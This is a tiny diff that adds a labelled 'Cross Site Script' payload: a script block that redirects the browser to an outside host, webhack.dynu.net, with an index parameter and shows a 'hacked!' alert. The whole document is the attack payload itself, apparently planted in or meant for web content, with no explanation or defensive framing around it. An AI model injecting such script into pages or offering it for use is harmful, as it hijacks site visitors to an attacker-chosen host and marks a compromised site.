@@ -1,0 +1,5 @@
+Cross Site Script
+<script>
+location.href='https://webhack.dynu.net/?idx=20191202.001'
+alert('hacked!;)');
+</script>
